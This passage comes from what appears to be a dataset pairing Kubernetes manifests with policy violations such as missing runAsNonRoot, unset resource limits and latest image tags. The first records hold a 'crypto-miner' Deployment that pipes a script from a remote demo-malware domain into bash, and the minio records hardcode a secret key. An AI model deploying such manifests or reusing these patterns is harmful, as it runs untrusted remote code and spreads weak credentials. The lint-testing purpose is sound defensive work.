    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crypto-miner\" is not set to runAsNonRoot"
  },
  {
    "id": "03473",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crypto-miner\" has cpu request 0"
  },
  {
    "id": "03474",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crypto-miner\" has memory limit 0"
  },
  {
    "id": "03475",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "03476",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "03477",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "03478",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "03479",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "03480",
    "manifest_path": "data/manifests/the_stack_sample/sample_1520.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-scott\n  name: spring-petclinic-scott-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-scott\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-scott\n        app.kubernetes.io/part-of: spring-petclinic-scott\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-scott\n    spec:\n      containers:\n      - image: spring-petclinic-scott:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "03481",
    "manifest_path": "data/manifests/the_stack_sample/sample_1520.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-scott\n  name: spring-petclinic-scott-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-scott\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-scott\n        app.kubernetes.io/part-of: spring-petclinic-scott\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-scott\n    spec:\n      containers:\n      - image: spring-petclinic-scott:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "03482",
    "manifest_path": "data/manifests/the_stack_sample/sample_1520.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-scott\n  name: spring-petclinic-scott-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-scott\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-scott\n        app.kubernetes.io/part-of: spring-petclinic-scott\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-scott\n    spec:\n      containers:\n      - image: spring-petclinic-scott:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "03483",
    "manifest_path": "data/manifests/the_stack_sample/sample_1520.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-scott\n  name: spring-petclinic-scott-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-scott\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-scott\n        app.kubernetes.io/part-of: spring-petclinic-scott\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-scott\n    spec:\n      containers:\n      - image: spring-petclinic-scott:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "03484",
    "manifest_path": "data/manifests/the_stack_sample/sample_1524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: registry.example.com/cryb/web:latest\n        name: web\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: web-env-secret\n        env:\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        ports:\n        - containerPort: 4000\n          name: http-server\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"registry.example.com/cryb/web:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03485",
    "manifest_path": "data/manifests/the_stack_sample/sample_1524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: registry.example.com/cryb/web:latest\n        name: web\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: web-env-secret\n        env:\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        ports:\n        - containerPort: 4000\n          name: http-server\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "03486",
    "manifest_path": "data/manifests/the_stack_sample/sample_1524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: registry.example.com/cryb/web:latest\n        name: web\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: web-env-secret\n        env:\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        ports:\n        - containerPort: 4000\n          name: http-server\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "03487",
    "manifest_path": "data/manifests/the_stack_sample/sample_1524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: registry.example.com/cryb/web:latest\n        name: web\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: web-env-secret\n        env:\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        ports:\n        - containerPort: 4000\n          name: http-server\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "03488",
    "manifest_path": "data/manifests/the_stack_sample/sample_1524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - image: registry.example.com/cryb/web:latest\n        name: web\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: web-env-secret\n        env:\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        ports:\n        - containerPort: 4000\n          name: http-server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "03489",
    "manifest_path": "data/manifests/the_stack_sample/sample_1525.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: getting-started-kaniko\nspec:\n  containers:\n  - name: getting-started\n    image: gcr.io/k8s-skaffold/skaffold-example-sub\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"getting-started\" is using an invalid container image, \"gcr.io/k8s-skaffold/skaffold-example-sub\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03490",
    "manifest_path": "data/manifests/the_stack_sample/sample_1525.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: getting-started-kaniko\nspec:\n  containers:\n  - name: getting-started\n    image: gcr.io/k8s-skaffold/skaffold-example-sub\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"getting-started\" does not have a read-only root file system"
  },
  {
    "id": "03491",
    "manifest_path": "data/manifests/the_stack_sample/sample_1525.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: getting-started-kaniko\nspec:\n  containers:\n  - name: getting-started\n    image: gcr.io/k8s-skaffold/skaffold-example-sub\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"getting-started\" is not set to runAsNonRoot"
  },
  {
    "id": "03492",
    "manifest_path": "data/manifests/the_stack_sample/sample_1525.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: getting-started-kaniko\nspec:\n  containers:\n  - name: getting-started\n    image: gcr.io/k8s-skaffold/skaffold-example-sub\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"getting-started\" has cpu request 0"
  },
  {
    "id": "03493",
    "manifest_path": "data/manifests/the_stack_sample/sample_1525.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: getting-started-kaniko\nspec:\n  containers:\n  - name: getting-started\n    image: gcr.io/k8s-skaffold/skaffold-example-sub\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"getting-started\" has memory limit 0"
  },
  {
    "id": "03494",
    "manifest_path": "data/manifests/the_stack_sample/sample_1526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vaccine\n  labels:\n    app: vaccine\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vaccine\n  template:\n    metadata:\n      labels:\n        app: vaccine\n    spec:\n      containers:\n      - name: vaccine\n        image: user09acr.azurecr.io/vaccine:latest\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 10\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 10\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 120\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 5\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"vaccine\" is using an invalid container image, \"user09acr.azurecr.io/vaccine:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03495",
    "manifest_path": "data/manifests/the_stack_sample/sample_1526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vaccine\n  labels:\n    app: vaccine\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vaccine\n  template:\n    metadata:\n      labels:\n        app: vaccine\n    spec:\n      containers:\n      - name: vaccine\n        image: user09acr.azurecr.io/vaccine:latest\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 10\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 10\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 120\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vaccine\" does not have a read-only root file system"
  },
  {
    "id": "03496",
    "manifest_path": "data/manifests/the_stack_sample/sample_1526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vaccine\n  labels:\n    app: vaccine\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vaccine\n  template:\n    metadata:\n      labels:\n        app: vaccine\n    spec:\n      containers:\n      - name: vaccine\n        image: user09acr.azurecr.io/vaccine:latest\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 10\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 10\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 120\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vaccine\" is not set to runAsNonRoot"
  },
  {
    "id": "03497",
    "manifest_path": "data/manifests/the_stack_sample/sample_1526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vaccine\n  labels:\n    app: vaccine\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vaccine\n  template:\n    metadata:\n      labels:\n        app: vaccine\n    spec:\n      containers:\n      - name: vaccine\n        image: user09acr.azurecr.io/vaccine:latest\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 10\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 10\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 120\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vaccine\" has cpu request 0"
  },
  {
    "id": "03498",
    "manifest_path": "data/manifests/the_stack_sample/sample_1526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vaccine\n  labels:\n    app: vaccine\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vaccine\n  template:\n    metadata:\n      labels:\n        app: vaccine\n    spec:\n      containers:\n      - name: vaccine\n        image: user09acr.azurecr.io/vaccine:latest\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 10\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 10\n        livenessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 120\n          timeoutSeconds: 2\n          periodSeconds: 5\n          failureThreshold: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vaccine\" has memory limit 0"
  },
  {
    "id": "03499",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "03500",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "03501",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "03502",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "03503",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~2.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:2.1.3\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_MESSAGE\n          value: Welcome to Flux Mr. Bond\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "03504",
    "manifest_path": "data/manifests/the_stack_sample/sample_1528.yaml",
